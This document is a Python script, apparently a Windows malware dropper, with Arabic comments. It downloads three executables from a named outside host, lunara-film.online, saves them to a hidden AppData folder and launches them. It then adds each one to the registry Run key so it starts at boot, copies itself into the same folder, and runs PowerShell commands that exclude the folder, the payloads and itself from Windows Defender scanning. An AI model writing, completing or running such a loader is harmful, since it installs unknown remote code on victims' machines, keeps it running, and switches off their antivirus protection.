import os
import requests
import subprocess
import winreg
import sys
import tempfile

# روابط الملفات EXE من موقعك
exe_urls = [
    "http://lunara-film.online/control-exe/my-program.exe",
    "http://lunara-film.online/control-exe/watcher-myap.exe",
    "http://lunara-film.online/control-exe/fun+fun4.+fun2_no_arabic.exe",
]

# استخدام مسار عام: %APPDATA%\MyAppFiles
appdata_dir = os.getenv('APPDATA')  # يعادل %APPDATA%
target_dir = os.path.join(appdata_dir, "MyAppFiles")
os.makedirs(target_dir, exist_ok=True)

def add_to_startup(name, path):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
        print(f"[+] Added to startup: {name}")
    except Exception as e:
        print(f"[!] Failed to add to startup: {e}")

def download_and_run_and_register(url):
    filename = url.split("/")[-1]
    file_path = os.path.join(target_dir, filename)

    # تحميل الملف إذا لم يكن موجود
    if not os.path.exists(file_path):
        print(f"Downloading {filename}...")
        try:
            response = requests.get(url, timeout=30)
            with open(file_path, "wb") as f:
                f.write(response.content)
            print(f"[+] Downloaded: {filename}")
        except Exception as e:
            print(f"[!] Failed to download {filename}: {e}")
            return

    else:
        print(f"[=] Already exists: {filename}")

    # تشغيل الملف
    try:
        subprocess.Popen(file_path, shell=True)
        print(f"[+] Launched: {filename}")
    except Exception as e:
        print(f"[!] Failed to run {filename}: {e}")

    # تسجيله للتشغيل عند الإقلاع
    add_to_startup(filename, file_path)

def add_windows_defender_exclusions():
    """
    إضافة استثناءات في Windows Defender للمجلد والبرامج
    """
    try:
        # الحصول على المسار الكامل للمجلد
        folder_path = os.path.abspath(target_dir)
        
        # إضافة استثناء للمجلد
        folder_command = f'powershell -Command "Add-MpPreference -ExclusionPath \"{folder_path}\""'
        subprocess.run(folder_command, shell=True, check=True, capture_output=True)
        print(f"[+] Added Windows Defender exclusion for folder: {folder_path}")
        
        # إضافة استثناء لكل ملف exe في المجلد
        for exe_url in exe_urls:
            filename = exe_url.split("/")[-1]
            file_path = os.path.join(folder_path, filename)
            
            file_command = f'powershell -Command "Add-MpPreference -ExclusionPath \"{file_path}\""'
            subprocess.run(file_command, shell=True, check=True, capture_output=True)
            print(f"[+] Added Windows Defender exclusion for file: {file_path}")
        
        # الحصول على مسار البرنامج الحالي (هذا البرنامج) - باستخدام sys.executable
        # هذا يعطي مسار الملف التنفيذي وليس المسار المؤقت
        current_program_path = sys.executable
        
        # إذا كان البرنامج يعمل من ملف Python مباشرة (ليس .exe)
        if current_program_path.endswith('python.exe') or current_program_path.endswith('pythonw.exe'):
            current_program_path = os.path.abspath(__file__)
        
        # إضافة استثناء للبرنامج الحالي (هذا البرنامج نفسه)
        current_program_command = f'powershell -Command "Add-MpPreference -ExclusionPath \"{current_program_path}\""'
        subprocess.run(current_program_command, shell=True, check=True, capture_output=True)
        print(f"[+] Added Windows Defender exclusion for this program: {current_program_path}")
        
        print("[+] All Windows Defender exclusions added successfully")
        
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to add Windows Defender exclusions: {e}")
    except Exception as e:
        print(f"[!] Error adding Windows Defender exclusions: {e}")

def copy_self_to_appdata():
    """
    نسخ البرنامج نفسه إلى مجلد AppData وإضافة استثناء للموقع الدائم
    """
    try:
        # الحصول على مسار البرنامج الحالي
        current_program_path = sys.executable
        
        # إذا كان البرنامج يعمل من ملف Python مباشرة
        if current_program_path.endswith('python.exe') or current_program_path.endswith('pythonw.exe'):
            current_program_path = os.path.abspath(__file__)
        
        # اسم الملف الأصلي
        original_filename = os.path.basename(current_program_path)
        
        # المسار الجديد في AppData
        new_program_path = os.path.join(target_dir, original_filename)
        
        # نسخ البرنامج إلى AppData إذا لم يكن موجوداً أو إذا كان مختلفاً
        if not os.path.exists(new_program_path) or os.path.getsize(current_program_path) != os.path.getsize(new_program_path):
            import shutil
            shutil.copy2(current_program_path, new_program_path)
            print(f"[+] Copied program to: {new_program_path}")
            
            # إضافة استثناء للموقع الجديد في AppData
            permanent_exclusion_command = f'powershell -Command "Add-MpPreference -ExclusionPath \"{new_program_path}\""'
            subprocess.run(permanent_exclusion_command, shell=True, check=True, capture_output=True)
            print(f"[+] Added permanent Windows Defender exclusion for: {new_program_path}")
        
        return new_program_path
        
    except Exception as e:
        print(f"[!] Failed to copy program to AppData: {e}")
        return None

# أولاً: نسخ البرنامج إلى AppData وإضافة استثناء دائم
print("📁 Copying program to permanent location...")
permanent_program_path = copy_self_to_appdata()

# ثانياً: إضافة استثناءات Windows Defender
print("🛡️ Adding Windows Defender exclusions...")
add_windows_defender_exclusions()

# ثالثاً: تنفيذ العملية لكل ملف
print("📥 Downloading and running programs...")
for exe_url in exe_urls:
    download_and_run_and_register(exe_url)

print("✅ All done.")